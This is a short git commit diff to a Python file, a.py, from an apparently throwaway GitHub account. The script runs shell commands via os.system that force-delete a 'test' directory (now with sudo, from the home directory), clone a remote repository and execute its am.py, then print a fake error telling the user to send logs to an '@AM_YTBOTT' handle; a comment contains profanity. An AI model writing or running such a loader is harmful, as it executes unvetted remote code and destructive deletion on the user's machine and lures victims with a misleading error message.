81b2bd57a01e9165e4492b8a9628ad130de17cfc
dghfhdgbxgbg <134328176+dghfhdgbxgbg@users.noreply.github.com>
2025-03-03 11:39:16 +0545

    Update a.py

--- a.py
+++ a.py
@@ -1,4 +1,4 @@
 from os import system # chala ja bhosdike madarchod
-system ("rm -rf test && git clone https://github.com/dghfhdgbxgbg/test && cd test && python3 am.py")
+system ("cd && sudo rm -rf test && git clone https://github.com/dghfhdgbxgbg/test && cd test && python3 am.py")
 # try af
 print ("YOU GOT ERROR SAVE THE LOGS AND GIVE THIS LOGS TO @AM_YTBOTT")
